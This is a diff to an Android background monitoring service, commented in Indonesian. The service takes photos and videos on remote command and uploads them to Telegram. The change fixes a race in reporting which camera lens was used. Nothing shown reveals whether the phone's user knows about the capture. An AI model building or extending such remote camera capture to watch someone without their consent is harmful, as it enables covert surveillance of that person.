@@ -10919,7 +10919,7 @@ class MonitoringService : Service() {
         }
         finishCaptureAttempt(wd)
         markMediaActive(photoFile)
-        sendCapturedPhoto(photoFile, reportResult, photoHashNow)
+        sendCapturedPhoto(photoFile, reportResult, photoHashNow, try { cameraService.lastLensFacing } catch (_: Exception) { -1 }, try { selectedLensFacing() } catch (_: Exception) { -1 })
     }
 
     private fun handleCaptureError(exception: Exception, attempt: Int, wd: Job, reportResult: Boolean) {
@@ -10980,7 +10980,7 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun sendCapturedPhoto(photoFile: File, reportResult: Boolean, photoHashNow: Long) {
+    private fun sendCapturedPhoto(photoFile: File, reportResult: Boolean, photoHashNow: Long, lensUsed: Int = -1, lensAsked: Int = -1) {
         serviceScope.launch {
             try {
                 if (!reportResult && dataSaverHoldNow(1)) {
@@ -10993,10 +10993,17 @@ class MonitoringService : Service() {
                 when (sendPhotoFile(photoFile)) {
                     MediaSendOutcome.SENT -> {
                         try { if (PhotoFingerprint.isComparableFingerprint(photoHashNow)) preferencesManager.setLastPhotoHashSync(photoHashNow) } catch (_: Exception) { }
+                        // Lensa dipotret saat jepret selesai
+                        // di pemanggil (issue #1538): membaca
+                        // lastLensFacing di sini — sesudah
+                        // unggah yang bisa lama — balapan
+                        // dengan jepretan lain yang menulis
+                        // ulang field itu; kabar bisa menyebut
+                        // lensa yang salah atau tertelan.
                         try {
-                            val used = cameraService.lastLensFacing
-                            val asked = selectedLensFacing()
-                            if (used != -1 && used != asked) {
+                            val used = lensUsed
+                            val asked = lensAsked
+                            if (used != -1 && asked != -1 && used != asked) {
                                 val name = when (used) {
                                     android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK -> "belakang"
                                     android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT -> "depan"
@@ -12955,6 +12962,8 @@ class MonitoringService : Service() {
                                 deleteQuietly(videoFile)
                                 sendToTelegram("⚠️ Video terlalu besar (>${MAX_VIDEO_BYTES / (1024L * 1024L)} MB). Coba /recordvideo dengan detik lebih sedikit.")
                             } else {
+                                val usedSnapshot = try { cameraService.lastLensFacing } catch (_: Exception) { -1 }
+                                val askedSnapshot = try { selectedLensFacing() } catch (_: Exception) { -1 }
                                 val uploadOutcome = kotlinx.coroutines.withTimeoutOrNull(VIDEO_UPLOAD_TIMEOUT_MS) { sendVideoFile(videoFile) }
                                 when (uploadOutcome ?: MediaSendOutcome.KEPT) {
                                     MediaSendOutcome.SENT -> {
@@ -12964,9 +12973,9 @@ class MonitoringService : Service() {
                                         // video dari lensa lain daripada
                                         // yang diminta tak lagi senyap.
                                         try {
-                                            val used = cameraService.lastLensFacing
-                                            val asked = selectedLensFacing()
-                                            if (used != -1 && used != asked) {
+                                            val used = usedSnapshot
+                                            val asked = askedSnapshot
+                                            if (used != -1 && asked != -1 && used != asked) {
                                                 val name = when (used) {
                                                     android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK -> "belakang"
                                                     android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT -> "depan"
